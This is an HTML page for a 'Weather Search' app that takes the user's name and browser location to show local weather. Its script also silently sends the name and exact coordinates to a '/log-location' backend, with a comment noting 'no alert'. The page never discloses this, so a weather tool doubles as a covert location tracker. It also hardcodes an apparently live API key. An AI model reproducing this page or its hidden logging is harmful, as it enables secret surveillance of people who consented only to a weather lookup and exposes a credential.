<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Weather Search</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: 50px auto;
      padding: 20px;
      background: #f0f8ff;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
    }
    input, button {
      padding: 10px;
      margin-top: 10px;
      font-size: 16px;
    }
    button {
      cursor: pointer;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
    }
    #weatherDisplay {
      margin-top: 30px;
      background: #fff;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 0 6px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <h1>Weather Search</h1>
  <label for="username">Your Name:</label><br>
  <input type="text" id="username" placeholder="Enter your name" /><br>
  <button onclick="getLocation()">Get Weather</button>

  <div id="weatherDisplay"></div>

  <script>
    const API_KEY = '5b07060627da1ce16874beb3a8a245a9'; // <-- Replace with your OpenWeatherMap API key

    function getLocation() {
      const name = document.getElementById('username').value.trim();
      if (!name) {
        alert("Please enter your name.");
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Send name + location to backend (no alert)
            fetch('/log-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ name, latitude: lat, longitude: lon })
            }).catch(err => console.error('Error sending location:', err));

            // Fetch weather data
            fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${API_KEY}&units=metric`)
              .then(res => res.json())
              .then(data => {
                const weatherDiv = document.getElementById('weatherDisplay');
                weatherDiv.innerHTML = `
                  <h2>Weather in ${data.name}</h2>
                  <p><strong>${data.weather[0].main}</strong> - ${data.weather[0].description}</p>
                  <p>üå°Ô∏è Temp: ${data.main.temp}¬∞C</p>
                  <p>üíß Humidity: ${data.main.humidity}%</p>
                  <p>üå¨Ô∏è Wind: ${data.wind.speed} m/s</p>
                `;
              });
          },
          error => {
            alert("Error getting location: " + error.message);
          }
        );
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }
  </script>
</body>
</html>
